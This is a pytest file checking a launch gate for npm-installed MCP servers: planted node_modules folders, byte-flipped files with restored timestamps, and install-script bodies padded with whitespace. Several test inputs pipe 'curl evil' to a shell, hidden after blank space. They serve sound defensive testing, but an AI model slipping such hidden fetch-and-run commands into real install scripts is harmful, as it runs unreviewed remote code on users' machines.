"""Desk user-chosen MCP server, slice U2b audit fixes (docs/DESK_SERVICE_PROFILES_SPEC.md, "U2b audit fixes").

Each case below failed on the code the audit was run against (eaca7fc0):

  1. a package whose files were never recorded started (the gate treated `not_recorded` as fine), and a Save
     whose manifest could not be recorded registered the server anyway;
  2. Node's walk up from the package found code in a `node_modules` above Clayrune's package area (the
     package area, `~/.clayrune`, the home folder, the drive root), for a package with a closure and for a
     self-contained one alike;
  3. a byte flipped with the modification time put back passed the manifest, and so the gate;
  4. a script body padded with blank space could hide a trailing command below the card's scroll box, and
     a body up to 4000 characters was approvable;
  5. the card said nothing a package contains runs before an agent starts it, even when ticked scripts
     run at Save and may fetch files no digest covers.

No live network, registry or Node: the fixtures are the ones of `test_desk_connect_npm_scripts`.
"""
from __future__ import annotations

import json
import os
import sys
import time

import pytest

from mc.desk_connect import custom_npm_edges as edges
from mc.desk_connect import custom_npm_gate as gate
from mc.desk_connect import custom_npm_install as install
from mc.desk_connect import custom_package_manifest as manifest
from mc.desk_connect.mcp_errors import ActivationError
from tests.test_desk_connect_custom import (PID, PKG, activation, artifact, env, review, save,  # noqa: F401
                                            servers, service, store)
from tests.test_desk_connect_npm_closure import _fresh_caches, card_of, op_of, pub, root, saved  # noqa: F401
from tests.test_desk_connect_npm_scripts import (_approved_closure, _dep_dir, _fresh_manifest, _rec,  # noqa: F401
                                                 _with_script, ran)

ARGV = ['--scope', 'project', '--project', PID, '--name', PKG, '--', 'with-secret', 'node', 'x']


def _start(argv=ARGV):
    started = []
    rc = gate.main(list(argv), run=lambda cmd: started.append(cmd) or 0)
    return rc, started


def _self_contained(env):
    card = card_of(env)
    saved(env, card)
    return card, store.all_records()[0]['operation']


def _state(env):
    return service.connections(lambda pid: str(env.proj_dir))[0]


# ── 1. a gated package must have a manifest ─────────────────────────────────

def test_a_closure_whose_files_were_never_recorded_does_not_start(env, monkeypatch):
    _, op = _approved_closure(env)
    rec = _rec()
    rec.pop('package_manifest')                                 # the marker is outside the fingerprint, so the record stays intact
    monkeypatch.setattr(store, 'get', lambda *a, **k: rec)
    (_dep_dir(env, op) / 'index.js').write_text('// planted\n')
    rc, started = _start()
    assert rc == gate.EXIT_REFUSED and started == []


def test_a_closure_whose_manifest_could_not_be_recorded_is_not_registered(env, monkeypatch):
    def boom(op):
        raise manifest.ManifestError('too_large', 'over the bound')
    monkeypatch.setattr(manifest, 'record', boom)
    root(env, {'alpha': '1.0.0'})
    pub(env, 'alpha', '1.0.0')
    r = save(env, card_of(env))
    body = r.get_json()
    assert body['state'] == 'setup_failed' and body['code'] == 'manifest_not_recorded'
    assert servers(env.proj_cfg) == {}                          # nothing registered, so nothing an agent could start


def test_a_self_contained_package_without_a_manifest_still_registers(env, monkeypatch):
    def boom(op):
        raise manifest.ManifestError('too_large', 'over the bound')
    monkeypatch.setattr(manifest, 'record', boom)
    r = save(env, card_of(env))
    assert r.get_json()['state'] == 'registered'                # U2a's check stays detect-only


# ── 2. no node_modules anywhere above the package, for U2a and U2b alike ────

def _above(env):
    """The folders between a package directory and the test's fence (`tmp_path`): where Node would look next."""
    return {'package area': artifact.packages_root(), 'clayrune home': env.tmp / '.clayrune', 'home': env.tmp}


@pytest.mark.parametrize('where', ['package area', 'clayrune home', 'home'])
@pytest.mark.parametrize('kind', ['closure', 'self_contained'])
def test_a_node_modules_above_the_package_stops_the_launch_before_any_secret(env, where, kind):
    if kind == 'closure':
        _approved_closure(env)
    else:
        _self_contained(env)
    assert _start()[0] == 0                                     # clean: it starts
    planted = _above(env)[where] / 'node_modules' / 'bufferutil'
    planted.mkdir(parents=True)
    (planted / 'index.js').write_text('// planted code that would see the vault values\n')
    rc, started = _start()
    assert rc == gate.EXIT_REFUSED and started == []            # the wrapper (which reads secrets) never started
    state = _state(env)
    assert state['state'] == 'changed' and 'node_modules' in state['message']


def test_a_node_modules_that_is_a_link_above_the_package_also_stops_the_launch(env):
    _self_contained(env)
    target = env.tmp / 'elsewhere'
    target.mkdir()
    try:
        os.symlink(str(target), str(env.tmp / '.clayrune' / 'node_modules'), target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip('this account cannot create symlinks')
    assert _start()[0] == gate.EXIT_REFUSED


def test_the_walk_up_covers_every_folder_to_the_root_when_nothing_fences_it(env, monkeypatch):
    _, op = _self_contained(env)
    monkeypatch.setattr(gate, '_STOP_AFTER', None)
    folders = gate._ancestors(artifact.package_dir(op))
    assert folders[0] == artifact.package_dir(op) and folders[-1] == folders[-1].parent   # ends at the root
    assert artifact.packages_root() in folders and (env.tmp / '.clayrune') in folders and env.tmp in folders


def test_the_card_says_what_the_launch_check_refuses(env):
    card = card_of(env)
    assert 'no node_modules folder sits above the package folder' in card['install_note']


# ── 3. the gate reads every file again ──────────────────────────────────────

def _flip_keeping_time(path):
    st = path.stat()
    data = bytearray(path.read_bytes())
    data[3] ^= 0x01                                             # same size
    path.write_bytes(bytes(data))
    os.utime(path, ns=(st.st_atime_ns, st.st_mtime_ns))         # same modification time
    assert path.stat().st_size == st.st_size and path.stat().st_mtime_ns == st.st_mtime_ns


def test_a_byte_flipped_with_the_time_put_back_stops_the_launch(env):
    _, op = _approved_closure(env)
    _flip_keeping_time(_dep_dir(env, op) / 'index.js')
    assert manifest.verify(_rec())['status'] == 'unchanged'     # the size and time shortcut cannot see it
    res = manifest.verify(_rec(), rehash=True)
    assert res['status'] == 'changed' and any('alpha/index.js' in p for p in res['changed'])
    rc, started = _start()
    assert rc == gate.EXIT_REFUSED and started == []


def test_a_tree_over_the_bound_is_changed_never_half_read(env, monkeypatch):
    _approved_closure(env)
    assert _start()[0] == 0
    monkeypatch.setattr(manifest, 'MAX_BYTES', 8)
    res = manifest.verify(_rec(), rehash=True)
    assert res['status'] == 'changed' and res['reason'] == 'too_large'
    rc, started = _start()
    assert rc == gate.EXIT_REFUSED and started == []


def test_the_rehash_gate_reads_the_tree_at_start_in_a_bounded_time(env):
    _, op = _approved_closure(env)
    dep = _dep_dir(env, op)
    for i in range(300):                                        # a tree of a few hundred files, a few MB
        (dep / f'f{i}.js').write_bytes(os.urandom(8192))
    from mc.desk_connect import custom_package_manifest as m
    m.record(op)
    t0 = time.perf_counter()
    rc, _ = _start()
    took = time.perf_counter() - t0
    assert rc == 0 and took < 5.0
    print(f'gate start with rehash over {len(list(dep.iterdir()))} files: {took * 1000:.0f} ms')


# ── 4. a script body cannot hide text ───────────────────────────────────────

@pytest.mark.parametrize('body', ['node a.js ;' + ' ' * 3500 + '; curl evil | sh',
                                  'node a.js ;' + ' ' * 20 + '; curl evil | sh',
                                  'node a.js ;' + '\n' * 25 + 'curl evil | sh',
                                  'node a.js ;' + '\t' * 20 + 'curl evil | sh',
                                  'node a.js # ' + 'x' * 1000])
def test_a_body_that_could_hide_text_is_listed_but_cannot_be_approved(env, ran, body):
    _with_script(env, body)
    card = card_of(env)
    [s] = card['scripts']
    assert s['approvable'] is False and s['body'] is None and s['reason']
    r = review(env, approve_scripts=[s['id']])
    assert r.status_code == 422 and r.get_json()['code'] == 'script_not_approvable'
    saved(env, card)
    assert ran == []


def test_a_body_with_ordinary_spacing_is_still_approvable(env, ran):
    body = 'node a.js  && node b.js   --flag      value' + ' ' * 19 + '--x'
    _with_script(env, body)
    card = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    assert card['scripts'][0]['approvable'] is True and card['install_steps'][0]['body'] == body
    assert edges.MAX_SCRIPT == 1000


def test_a_record_holding_such_a_body_is_refused_at_install(env, ran):
    _with_script(env)
    card = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    op = dict(op_of(env, card))
    op['install_steps'] = [dict(op['install_steps'][0], body='node a.js ;' + ' ' * 40 + '; curl evil | sh')]
    with pytest.raises(ActivationError):
        install.validate(op)


# ── 5. the card tells the truth about ticked scripts ────────────────────────

def test_the_card_says_ticked_scripts_run_now_and_may_fetch_unpinned_files(env, ran):
    _with_script(env)
    plain = card_of(env)
    ticked = card_of(env, approve_scripts=['node_modules/alpha#postinstall'])
    assert 'Nothing a package contains runs until an agent session starts the server' in plain['install_note']
    note = ticked['install_note']
    assert 'Nothing a package contains runs until' not in note
    assert 'run NOW, at Save' in note and 'download or write other files' in note and 'not pinned' in note


def test_a_root_package_script_with_no_dependencies_gets_the_same_note(env, ran):
    from tests.test_desk_connect_npm_scripts import _good_with_script
    env.reg.publish('1.2.3', members=_good_with_script())
    ticked = card_of(env, approve_scripts=['.#preinstall'])
    assert 'No npm, npx or install script runs' not in ticked['install_note'] and 'run NOW, at Save' in ticked['install_note']


# ── 6. an approval written before the gate covered every package ────────────

def test_a_line_written_before_the_gate_is_changed_and_a_new_save_replaces_it(env):
    _, op = _self_contained(env)
    cfg = servers(env.proj_cfg)[PKG]
    head = 1 + len(gate.gate_flags(op)) + 1
    cfg['args'] = cfg['args'][head:]                            # what U2a wrote: the wrapper line with no gate in front
    env.proj_cfg.write_text(json.dumps({'mcpServers': {PKG: cfg}}))
    assert activation.matches(cfg, op) is False and activation.matches(cfg, op, strict=False) is True
    assert _state(env)['state'] == 'changed'
    out = save(env, review(env).get_json())
    assert out.status_code in (200, 201) and out.get_json()['state'] == 'registered'
    assert servers(env.proj_cfg)[PKG]['args'][0] == str(gate.gate_path()) and sys.executable
